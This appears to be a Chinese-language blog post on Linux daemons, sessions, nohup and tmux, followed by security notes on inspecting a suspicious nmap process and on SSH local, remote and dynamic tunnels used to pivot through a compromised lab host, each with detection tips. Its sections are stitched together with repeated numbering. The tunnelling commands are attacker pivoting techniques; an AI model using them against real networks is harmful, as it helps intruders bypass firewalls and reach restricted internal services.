 - `子进程调用setsid()开启一个新回话并释放它与控制终端之间的所有关联关系。`结果就是使子进程: (a)成为新会话的首进程，(b)成为一个新进程组的组长进程，(c)没有控制终端。
 - 如果daemon从来没有打开过终端设备，那么就无需担心daemon会重新请求一个控制终端了。如果daemon后面可能会打开一个终端设备，那么必须要采取措施来确保这个设备不会成为控制终端。这可以通过下面两种方式实现：
 - 在所有可能应用到一个终端设备上的open()调用中指定O_NOCTTY标记。
 - 或者更简单地说，`在setsid()调用之后执行第二个fork()`，然后再次让父进程退出并让孙子进程继续执行。这样就确保了子进程不会称为会话组长，因此根据System V中获取终端的规则，进程永远不会重新请求一个控制终端。（多一个fork()调用不会带来任何坏处。）
 - `清除进程的umask以确保当daemon创建文件和目录时拥有所需的权限。`
 - `修改进程的当前工作目录，通常会改为根目录（/）。`这样做是有必要的，因为daemon通常会一直运行直至系统关闭为止。如果daemon的当前工作目录为不包含/的文件系统，那么就无法卸载该文件系统。或者daemon可以将工作目录改为完成任务时所在的目录或在配置文件中定义一个目录，只要包含这个目录的文件系统永远不会被卸载即可。
 - `关闭daemon从其父进程继承而来的所有打开着的文件描述符。`（daemon可能需要保持继承而来的文件描述的打开状态，因此这一步是可选的或者可变更的。）之所以这样做的原因有很多。由于daemon失去了控制终端并且是在后台运行的，因此让daemon保持文件描述符0（标准输入）、1（标准输出）和2（标准错误）的打开状态毫无意义，因为它们指向的就是控制终端。此外，无法卸载长时间运行的daemon打开的文件所在的文件系统。因此，通常的做法是关闭所有无用的打开着的文件描述符，因为文件描述符是一种有限的资源。
 - `在关闭了文件描述符0、1和2之后，daemon通常会打开/dev/null并使用dup2()（或类似的函数）使所有这些描述符指向这个设备。`之所以要这样做是因为下面两个原因：
 - 它确保了当daemon调用了在这些描述符上执行I/O的库函数时不会出乎意料地失败。
 - 它防止了daemon后面使用描述符1或2打开一个文件的情况，因为库函数会将这些描述符当做标准输出和标准错误来写入数据（进而破坏了原有的数据）。

 说了这么多，还是那一个实际的守护进程出来看一下吧，以sshd为例

因为守护进程PPID为1，而且是在单独的进程组、单独的session中，所以PID=PGID=SID，同时终端处值为 ? , 终端前台进程组ID设置为-1

杀死守护进程没啥特别的，该杀杀,当然前提是权限要够

看到这里已经可以了，基本上知识点都接触到了，下面是我在关于进程相关知识学习过程中思考的一些问题，不解决不舒服那种，无聊的可以看一看

### 5. VPS 上建立监听

`mkdir listen_test
cd listen_test
python3 -m http.server 80
python3 -m http.server 443

```

### 6. dies und das

- ping www.baidu.com & 这种后台进程是不是守护进程

 不是

存在标准输出和标准错误

 - nohup ping www.baidu.com &

 不是

还是存在标准输出，只不过是重定向到 nohup.out中了

 - ping www.baidu.com > /dev/null 2>&1 & 更像是守护进程了吗

 更像了，但还不是

这种形式确实是不在存在标准输出，标准输出，标准错误，但是PPID还不是1

 - 不就是PPID=1吗？ 上代码

 `#include <unistd.h>
#include <stdio.h>

int main()
{
    setbuf(stdout, NULL);
    pid_t pid;
    pid = fork();
    if(pid == 0){
        system("ping www.baidu.com > /dev/null 2>&1 &");
    } else {
        exit(0);
    }
}

```

 - 无标准输入、无标准输出、无标准错误
 - ppid=1

 现在更像是守护进程了，但是PID,PGID,SID还是不相等，终端处值不为 ? , 终端前台进程组ID也不是-1，目录也不是根目录，换句话说还是受到终端的控制。

具体创建一个守护进程的代码网上有的是，自己搜索吧，既有直接使用daemon()函数生成的，也有一步一步按照上面描述去生成的，推荐先看看后者。

 - 我们ssh断开链接后session还在吗？

 我使用两个终端连接同一个服务器的ssh

可以看到，现在有两个SID，我们使用 1682 这个session来进行执行`ping www.baidu.com`之后ctrl+c 中断，exit退出连接

我们使用1731的shell来查看

SID为1682的session不存在了，ping 的命令也被我们中断了

现在我们还是使用两个终端连接ssh

我们使用 1788的shell来执行 ping www.baidu.com & 之后exit退出ssh连接

从这里可以看到，虽然我们把ssh连接退出了，但是后台进行依旧在这个session上执行，还属于这个会话，所以如果session存在还在执行的后台进程，即使关闭终端或者断开ssh等远程连接，session还是会存在的

 - nohup 命令意义难道仅仅就是将标准输出，标准错误重定向到 nohup.out 吗？

 如果仅仅是输出重定向，我们可以直接使用 > ，为什么会有nohup命令呢？没有点啥重要作用也对不起这个名字呀！

其实呢，产生这个疑问的主要原因就是问题5我们仅仅从表面现象就得出了结论，而没有进行本质上的剖析，所以如果只看到问题5的哥们儿可能要被误导了...

当一个终端关闭或者ssh等远程连接退出的时候，系统会向session管理的所有进程发送一个SIGHUP信号，这个信号就是挂断的意思，效果就是进程中断，理论上问题5中 ping www.baidu.com 这个后台进程也应该能够收到，但是，在session要断开这种情况是否给属于session的后台进程发送SIGHUP信号是受系统一个配置参数控制的——huponexit ，一般情况下，这个参数的缺省是off，也就是说，关闭终端不一定就会收到SIGHUP信号。

 `shopt | grep huponexit

```

可以看到，在当前系统中，该参数为off，所以才会出现终端关闭或者ssh等远程连接断开的时候，后台进程能够继续以这个session运行

此时再说 nohup 应该就很清晰了，nohup其实就是忽略SIGHUP信号，这样保证我们的程序在后台平稳执行

 - tmux 后台执行的效果更好，tmux的底层原理是什么呢？

 还是使用两个终端来进行

 `ctrl b+d
tmux ls

```

我们使用另一个终端观察一下：

可以看到，其实tmux创建了一个守护进程，进程PID=1348，之后通过守护进程创建 bash，之后通过bash执行ping，创建ping www.baidu.com

为了更加严谨证实这个观点，我们再创建一个tmux任务

现在是ping百度和新浪同时跑着，再观察一下

中间STAT为Zs的进程是因为我忘了截图，就退出了重新来的导致的，不用关注

可以看到的是，对于每一个任务，tmux都会创建一个新的session、进程组、进程，这样实现多个进程之间互不影响

至此，关于Linux的进程相关知识应该将明白了，如果想从更加底层去分析，就去学习学习C和汇编吧！

参考文章

https://www.cnblogs.com/lvyahui/p/7389554.html

https://wudaijun.com/2016/08/linux-job-control/

https://zhuanlan.zhihu.com/p/80439267

http://www.ruanyifeng.com/blog/2016/02/linux-daemon.html

https://blog.csdn.net/weicao1990/article/details/78639549

http://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-commands.html

https://segmentfault.com/a/1190000022770900

https://segmentfault.com/q/1010000000310278

https://blog.csdn.net/hust_sheng/article/details/50766752

https://segmentfault.com/a/1190000022097240

https://ytlee.cn/2020/05/the-difference-between-daemon-and-background-process/

https://www.cnblogs.com/lvyahui/p/7389554.html

https://www.jianshu.com/p/eed75164334d

https://www.lujun9972.win/blog/2019/08/26/%E5%A6%82%E4%BD%95kill%E6%95%B4%E4%B8%80%E4%B8%AA%E8%BF%9B%E7%A8%8B%E7%BB%84%E6%88%96%E4%BC%9A%E8%AF%9D/index.html

### 6. 使用 nmap 模拟对 VPS 的访问

`virus_info.txt` 文件内容如下

 `[ lsof -p 20657 ]
COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME
nmap    20657 root  cwd    DIR    8,2     4096  524291 /home/join
nmap    20657 root  rtd    DIR    8,2     4096       2 /
nmap    20657 root  txt    REG    8,2  2961432  798351 /usr/bin/nmap
nmap    20657 root  mem    REG    8,2    47568 1581433 /lib/x86_64-linux-gnu/libnss_files-2.27.so
nmap    20657 root  mem    REG    8,2    97176 1581430 /lib/x86_64-linux-gnu/libnsl-2.27.so
nmap    20657 root  mem    REG    8,2    47576 1581435 /lib/x86_64-linux-gnu/libnss_nis-2.27.so
nmap    20657 root  mem    REG    8,2    39744 1581431 /lib/x86_64-linux-gnu/libnss_compat-2.27.so
nmap    20657 root  mem    REG    8,2   445768  798342 /usr/lib/x86_64-linux-gnu/blas/libblas.so.3.7.1
nmap    20657 root  mem    REG    8,2    14560 1581426 /lib/x86_64-linux-gnu/libdl-2.27.so
nmap    20657 root  mem    REG    8,2   144976 1581438 /lib/x86_64-linux-gnu/libpthread-2.27.so
nmap    20657 root  mem    REG    8,2  2030928 1581423 /lib/x86_64-linux-gnu/libc-2.27.so
nmap    20657 root  mem    REG    8,2    96616 1581418 /lib/x86_64-linux-gnu/libgcc_s.so.1
nmap    20657 root  mem    REG    8,2  1700792 1581427 /lib/x86_64-linux-gnu/libm-2.27.so
nmap    20657 root  mem    REG    8,2  1594864  796948 /usr/lib/x86_64-linux-gnu/libstdc++.so.6.0.25
nmap    20657 root  mem    REG    8,2    59408  798344 /usr/lib/x86_64-linux-gnu/liblinear.so.3.2.
nmap    20657 root  mem    REG    8,2   224048  798347 /usr/lib/x86_64-linux-gnu/liblua5.3.so.0.0.0
nmap    20657 root  mem    REG    8,2   116960 1573720 /lib/x86_64-linux-gnu/libz.so.1.2.11
nmap    20657 root  mem    REG    8,2  2917216  792886 /usr/lib/x86_64-linux-gnu/libcrypto.so.1.1
nmap    20657 root  mem    REG    8,2   577312  792985 /usr/lib/x86_64-linux-gnu/libssl.so.1.1
nmap    20657 root  mem    REG    8,2   265344  792967 /usr/lib/x86_64-linux-gnu/libpcap.so.1.8.1
nmap    20657 root  mem    REG    8,2   464824 1573695 /lib/x86_64-linux-gnu/libpcre.so.3.13.3
nmap    20657 root  mem    REG    8,2   179152 1581419 /lib/x86_64-linux-gnu/ld-2.27.so
nmap    20657 root    0u   CHR  136,1      0t0       4 /dev/pts/1
nmap    20657 root    1u   CHR  136,1      0t0       4 /dev/pts/1
nmap    20657 root    2u   CHR  136,1      0t0       4 /dev/pts/1
nmap    20657 root    3r   CHR    5,0      0t0      13 /dev/tty
nmap    20657 root    4u  IPv4 169623      0t0     TCP ubuntu:43930->service-123456.bj.tencentcs.com:domain (SYN_SENT)

[ cat /proc/20657/maps -w ]
55c0e5298000-55c0e53e6000 r-xp 00000000 08:02 798351                     /usr/bin/nmap
55c0e55e6000-55c0e55eb000 r--p 0014e000 08:02 798351                     /usr/bin/nmap
55c0e55eb000-55c0e576b000 rw-p 00153000 08:02 798351                     /usr/bin/nmap
55c0e576b000-55c0e5792000 rw-p 00000000 00:00 0
55c0e66b7000-55c0e6c37000 rw-p 00000000 00:00 0                          [heap]
7fe9f2ccb000-7fe9f2cd6000 r-xp 00000000 08:02 1581433                    /lib/x86_64-linux-gnu/libnss_files-2.27.so
7fe9f2cd6000-7fe9f2ed5000 ---p 0000b000 08:02 1581433                    /lib/x86_64-linux-gnu/libnss_files-2.27.so
...
...
7fe9f5d65000-7fe9f5d66000 rw-p 0002a000 08:02 1581419                    /lib/x86_64-linux-gnu/ld-2.27.so
7fe9f5d66000-7fe9f5d67000 rw-p 00000000 00:00 0
7ffee5382000-7ffee53a3000 rw-p 00000000 00:00 0                          [stack]
7ffee53a9000-7ffee53ac000 r--p 00000000 00:00 0                          [vvar]
7ffee53ac000-7ffee53ae000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

[ ls -al /proc/20657/exe ]
lrwxrwxrwx 1 root root 0 Jul  2 15:03 /proc/20657/exe -> /usr/bin/nmap

```
 我们可以获取到以下信息：

 - 进程 pid 为 `20657`
 - 启这个进程的二进制文件为 `/usr/bin/nmap`
 - 启这个进程的时候攻击者所在的目录为 `/home/join`
 - 启这个进程的用户为 `root`

### 本地转发隧道

Ubuntu 上的apache 服务默认返回页面如下

我们使用一下配置，这样 Ubuntu 主机不允许我们的攻击机直接进行连接

重启apache后，再次访问如下

现在我们通过被控主机 Centos 的 SSH 来做隧道，实现将访问受限的 Ubuntu 的 apache 映射出来

假设我们已经得到了 Centos 的密码（或者将我们的密钥写入进去，通过公钥进行认证）

攻击机（物理机 10.211.55.2）执行

`ssh -fCNg -L 8008:10.211.55.10:80 helper@10.211.55.11 -p 22`

 - -f 后台执行
 - -N 不需要TTY，即notty
 - -C 使用压缩
 - -g 设置监听端口为 0.0.0.0 这种形式

现在攻击机直接访问自己的 8008 端口就可以访问到受限主机的 apache 了

可以看到，我们的隧道成功了，已经成功将访问受限的 Ubuntu apache 映射到了攻击机本地

我们看一下Ubuntu上 Apache 的日志 `/var/log/apache2/access.log`

这里可以看到，日志记录的访问IP为受控主机Centos的IP

我们来看一下受控主机是否存在异常

 - 网络连接

从流量上看多了一个攻击机连接受控主机Centos 22端口的连接，同时多了一个受控主机Centos 访问 10.211.55.10 80端口的连接，在我们实验主机中可以清晰看出来，但是如果在实际情况中，很多业务在使用同一个主机的时候，是非常难以分辨出这是一个SSH隧道的，所以从网络连接上辨别SSH隧道难度较大

 - 进程

​   从进程角度来查看多了一个ssh连接进程，这个进程很可能就是有问题的了，可以联系相关主机业务人员确认

 - 日志

 使用lastb 来查看异常登录日志,未发现内容

查看日志文件 `/var/log/secure`

可以看到，存在来自攻击机（物理机 10.211.55.2）的ssh认证连接

对于SSH本地转发隧道来说，执行命令是在攻击机上，所以无法通过history查到任何信息

从上面来看，主要发现SSH隧道的手段就是查看网络连接和日志，这种连接与正常的SSH连接无异，所以较难分辨

### 远程转发隧道

受控机Centos 通过ssh远程连接我们的攻击机(物理机)，并且在我们攻击机上开放一个端口（8008），做socks隧道

反向的好处是在一些防火墙配置下，可能内网主机外联端口会有限制，这样我们通过配置攻击机SSH端口为 53 端口可能成功穿过防火墙

之所以要受控主机远程连接我们物理机，是因为ssh默认配置 -R 参数开放端口绑定的地址是 127.0.0.1 而不是 0.0.0.0 ,这就导致即使我们正向在受控主机 Centos上开了 8008 端口，我们也无法连接，所以我们采用反向的方式

Centos 上执行 `ssh -fCNg -R 8008:10.211.55.10:80 helper@10.211.55.2 -p 22`

我们的攻击机就开放了一个8008端口，访问8008端口就直接访问到访问受限主机 Ubuntu 的80端口

现在我们看一下受控主机Centos存在哪些异常

 - 网络连接

网络连接可以看出受控主机SSH远程连接我们的物理机，遇到这种情况就需要进行和主机、业务人员确认连接是否正常业务

 - 进程

进程中可以看到我们执行的命令

 - 日志

​   从history 中可以看到我们的连接操作，关于history的知识点可以查看善后工作中的history

### 动态隧道

上面的两种隧道都是仅仅转发一个IP的一个端口，对于攻击者来说，需要攻击内网的不同应用，如果每攻击一个应用就要映射一次就太麻烦了，所以SSH提供了一种动态隧道，类似代理模式，流量发到入口，由SSH Server来判断具体是否什么协议，转发到那台服务器

动态隧道是一种本地转发隧道,在绑定端口开一个socks4/5的代理，直接设置代理后可以访问内网主机

攻击机（物理机）执行

`ssh -fNCg -D 8008 helper@10.211.55.11`

攻击机配置代理

挂上代理访问 Ubuntu 的 80端口

成功访问！

我们来看一下受控主机 Centos 存在哪些异常

 - 网络连接

​   还是一样，能看到网络连接，需要与相关人员确认

 - 进程

​   从进程可以看出多了一个ssh，其他没啥

 - 日志

 异常登录日志中无异常

​   在 /var/log/secure 中可以看到 ssh 认证连接
